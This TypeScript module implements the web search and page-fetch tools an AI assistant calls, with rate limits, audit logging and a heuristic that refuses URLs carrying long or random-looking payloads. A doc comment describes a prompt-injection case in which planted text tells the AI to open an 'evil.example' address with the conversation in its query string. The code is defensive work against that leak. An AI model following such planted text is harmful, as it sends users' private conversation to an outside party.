// SPDX-License-Identifier: LicenseRef-TigerAI-SUL-Draft
import { writeAudit } from "../accounts/audit";
import { ServiceError } from "../accounts/service";
import { KEY_REQUIRED } from "../accounts/secret-dest";
import { FetchRefused, decodeBody, htmlToText, robotsPermits, safeGet } from "./net";
import { NOT_ALLOWED_MESSAGE, sameSite, type FetchScope } from "./allowlist";
import { mayUseWeb, readSearchKey, readWebSettings, type Provider } from "./settings";

/**
 * 上網查資料: the two operations behind the AI tools web_search and web_fetch. Everything that decides is here (switch, groups, rate
 * limit, address safety, caps); the extension only passes the caller through. Audit rows carry the query or URL, the person and the
 * channel, never the page text or the answer.
 */

export interface SearchHit { title: string; url: string; snippet: string }
const MAX_RESULTS = 8;
const SEARCH_TIMEOUT_MS = 15_000;
export const FETCH_TEXT_CHARS = 12_000;

// ---------------------------------------------------------------- rate limit (per person, sliding minute; in memory)
const LIMITS = { search: 12, fetch: 24, slides: 6 } as const;
const RL = Symbol.for("tigerai:web-ratelimit");
export function rateLimitHit(userId: string, kind: keyof typeof LIMITS, now = Date.now()): boolean {
  const g = globalThis as unknown as Record<symbol, Map<string, number[]> | undefined>;
  const m = (g[RL] ??= new Map());
  const k = `${kind}:${userId}`;
  const recent = (m.get(k) ?? []).filter((t: number) => now - t < 60_000);
  if (recent.length >= LIMITS[kind]) { m.set(k, recent); return true; }
  recent.push(now); m.set(k, recent);
  return false;
}
export function resetRateLimit(): void { (globalThis as unknown as Record<symbol, unknown>)[RL] = undefined; }

export type Person = { id: string; role: string };
function guard(person: Person | null, kind: keyof typeof LIMITS): asserts person is Person {
  if (!person || !mayUseWeb(person)) throw new ServiceError("web_off", "上網查資料 is not available to you (switched off or not enabled for your group).", 403);
  if (rateLimitHit(person.id, kind)) throw new ServiceError("web_rate", "Too many web requests in the last minute. Wait a little and try again.", 429);
}

const cleanText = (s: unknown, n: number) => (typeof s === "string" ? s.replace(/\s+/g, " ").trim().slice(0, n) : "");
const httpOnly = (u: unknown): string | null => { try { const x = new URL(String(u)); return x.protocol === "http:" || x.protocol === "https:" ? x.toString() : null; } catch { return null; } };

// ---------------------------------------------------------------- providers
async function getJson(url: string, init: RequestInit): Promise<unknown> {
  const res = await fetch(url, { ...init, signal: AbortSignal.timeout(SEARCH_TIMEOUT_MS), redirect: "error" });
  if (!res.ok) throw new ServiceError("search_failed", `The search service answered HTTP ${res.status}`, 502);
  return res.json();
}

export async function searchWith(provider: Provider, query: string, cfg: { searxUrl: string; key: string | null }): Promise<SearchHit[]> {
  let raw: { title?: unknown; url?: unknown; snippet?: unknown }[] = [];
  try {
    if (provider === "searxng") {
      if (!cfg.searxUrl) throw new ServiceError("no_search_url", "The SearXNG address is not set", 503);
      const d = await getJson(`${cfg.searxUrl}/search?${new URLSearchParams({ q: query, format: "json", safesearch: "1" })}`, { headers: { accept: "application/json", "user-agent": "OpenAgentPortal-Search/1.0" } }) as { results?: { title?: string; url?: string; content?: string }[] };
      raw = (d.results ?? []).map((r) => ({ title: r.title, url: r.url, snippet: r.content }));
    } else if (provider === "brave") {
      if (!cfg.key) throw new ServiceError("no_search_key", "The search API key is not set", 503);
      const d = await getJson(`https://api.search.brave.com/res/v1/web/search?${new URLSearchParams({ q: query, count: String(MAX_RESULTS) })}`, { headers: { accept: "application/json", "x-subscription-token": cfg.key } }) as { web?: { results?: { title?: string; url?: string; description?: string }[] } };
      raw = (d.web?.results ?? []).map((r) => ({ title: r.title, url: r.url, snippet: r.description }));
    } else {
      if (!cfg.key) throw new ServiceError("no_search_key", "The search API key is not set", 503);
      const d = await getJson("https://api.tavily.com/search", { method: "POST", headers: { "content-type": "application/json", authorization: `Bearer ${cfg.key}` }, body: JSON.stringify({ query, max_results: MAX_RESULTS }) }) as { results?: { title?: string; url?: string; content?: string }[] };
      raw = (d.results ?? []).map((r) => ({ title: r.title, url: r.url, snippet: r.content }));
    }
  } catch (e) {
    if (e instanceof ServiceError) throw e;
    throw new ServiceError("search_failed", "The search service could not be reached", 502);
  }
  const seen = new Set<string>(); const out: SearchHit[] = [];
  for (const r of raw) {
    const url = httpOnly(r.url);
    if (!url || seen.has(url)) continue;
    seen.add(url);
    out.push({ title: cleanText(r.title, 160) || url, url, snippet: cleanText(r.snippet, 300) });
    if (out.length >= MAX_RESULTS) break;
  }
  return out;
}

/** Admin's 「測試」: one sample query with the (possibly unsaved) values from the form. Not rate limited, audited without the key. */
export async function testSearch(actorId: string, input: { provider?: Provider; searxUrl?: string; apiKey?: string }) {
  const s = readWebSettings();
  const t0 = Date.now();
  try {
    // The saved key is sent only to the provider it was saved for; another provider needs the key typed again (H1).
    const storedKey = readSearchKey();
    if (storedKey && !(typeof input.apiKey === "string" && input.apiKey.trim()) && input.provider && input.provider !== s.provider) {
      writeAudit("web.test", actorId, { provider: input.provider, ok: false, code: "key_required" });
      return { ok: false, ms: 0, error: KEY_REQUIRED, code: "key_required" };
    }
    const hits = await searchWith(input.provider ?? s.provider, "OpenAI", { searxUrl: (input.searxUrl ?? s.searxUrl).replace(/\/+$/, ""), key: input.apiKey || readSearchKey() });
    writeAudit("web.test", actorId, { provider: input.provider ?? s.provider, ok: true, results: hits.length });
    return { ok: true, results: hits.length, ms: Date.now() - t0 };
  } catch (e) {
    const msg = e instanceof Error ? e.message : "failed";
    writeAudit("web.test", actorId, { provider: input.provider ?? s.provider, ok: false });
    return { ok: false, ms: Date.now() - t0, error: msg };
  }
}

// ---------------------------------------------------------------- the two operations the AI calls

export async function webSearch(person: Person | null, query: string, roomId: string | null): Promise<SearchHit[]> {
  guard(person, "search");
  const q = cleanText(query, 300);
  if (q.length < 2) throw new ServiceError("bad_query", "Give a search query of at least 2 characters");
  const s = readWebSettings();
  writeAudit("web.search", person.id, { query: q, room: roomId, provider: s.provider });
  return searchWith(s.provider, q, { searxUrl: s.searxUrl, key: readSearchKey() });
}

// ---------------------------------------------------------------- what may leave in a URL

const entropy = (t: string): number => { const f = new Map<string, number>(); for (const c of t) f.set(c, (f.get(c) ?? 0) + 1); let h = 0; for (const n of f.values()) { const p = n / t.length; h -= p * Math.log2(p); } return h; };
const safeDecode = (v: string): string => { try { return decodeURIComponent(v.replace(/\+/g, " ")); } catch { return v; } };
/**
 * A page address is a way to carry data OUT: a stranger's text can tell the AI to open https://evil.example/?q=<what was said above>.
 * The address is refused when its query string, fragment or a path segment looks like a payload rather than a page: a value longer
 * than 200 characters, a long run that looks random (base64/hex/token), or readable running text (many words, or a long stretch
 * of non-ASCII text such as Chinese sentences). Ordinary search and article addresses are far below all of these.
 * Heuristic, not a proof: short leaks (a name, an order number) still pass. Returns the reason, or null.
 */
export function exfiltrationReason(u: URL): string | null {
  const pieces: { where: string; v: string }[] = [];
  for (const [k, v] of u.searchParams) { pieces.push({ where: "query", v }); if (k.length > 200) return "long_query_name"; }
  if (u.hash.length > 1) pieces.push({ where: "fragment", v: safeDecode(u.hash.slice(1)) });
  for (const seg of u.pathname.split("/")) if (seg.length > 120) pieces.push({ where: "path", v: safeDecode(seg) });
  if (u.search.length > 600) return "long_query";
  for (const { where, v } of pieces) {
    if (v.length > 200) return `long_${where}`;
    if (v.length >= 40 && !/\s/.test(v) && /^[A-Za-z0-9+/=_-]+$/.test(v) && entropy(v) > 4.0) return `opaque_${where}`;
    if (v.trim().split(/\s+/).length >= 8) return `text_${where}`;
    if ((v.match(/[^\x00-\x7f]/g)?.length ?? 0) >= 24) return `text_${where}`;
  }
  return null;
}

export interface Page { url: string; finalUrl: string; title: string; text: string; truncated: boolean; status: number }
/** `scope` is the conversation's own list (allowlist.ts): the AI's tool always passes it; a direct service call (tests, admin tools) may omit it. */
export async function webFetch(person: Person | null, rawUrl: string, roomId: string | null, signal?: AbortSignal, scope?: FetchScope): Promise<Page> {
  guard(person, "fetch");
  const url = String(rawUrl ?? "").trim().slice(0, 2000);
  let parsed: URL;
  try { parsed = new URL(url); } catch { throw new ServiceError("bad_url", "That is not a valid URL"); }
  if (scope && !scope.allowed(url)) {
    writeAudit("web.fetch_blocked", person.id, { host: parsed.host, reason: "not_in_conversation", length: url.length, room: roomId });
    throw new ServiceError("fetch_not_allowed", NOT_ALLOWED_MESSAGE, 422);
  }
  const leak = exfiltrationReason(parsed);
  if (leak) {
    // Logged without the payload (it may be the very conversation text we are keeping in): the host, why, and how long.
    writeAudit("web.fetch_blocked", person.id, { host: parsed.host, reason: leak, length: url.length, room: roomId });
    throw new ServiceError("fetch_payload", "That address carries a long block of text or data in it, so it was not opened. Open pages by their plain address.", 422);
  }
  // The URL is logged as given (it is what the person or the model asked for); the page itself is never logged.
  writeAudit("web.fetch", person.id, { url, room: roomId });
  try {
    if (!(await robotsPermits(parsed))) throw new FetchRefused("robots", "The site's robots.txt asks automated readers not to open this page");
    const r = await safeGet(url, { signal, ...(scope ? { redirectOk: (from: URL, to: URL) => sameSite(from.hostname, to.hostname) } : {}) });
    if (r.status >= 400) throw new FetchRefused("status", `The page answered HTTP ${r.status}`);
    const decoded = decodeBody(r.body, r.charset);
    const isHtml = r.contentType === "" || /html/.test(r.contentType);
    const { title, text } = isHtml ? htmlToText(decoded) : { title: "", text: decoded.trim() };
    return { url, finalUrl: r.finalUrl, title, text: text.slice(0, FETCH_TEXT_CHARS), truncated: r.truncated || text.length > FETCH_TEXT_CHARS, status: r.status };
  } catch (e) {
    if (e instanceof FetchRefused) {
      const msg = e.reason === "address" ? "That address is not on the public internet, so it cannot be read." : e.message;
      throw new ServiceError(`fetch_${e.reason}`, msg, 422);
    }
    if (e instanceof ServiceError) throw e;
    throw new ServiceError("fetch_network", "Could not read that page", 422);
  }
}
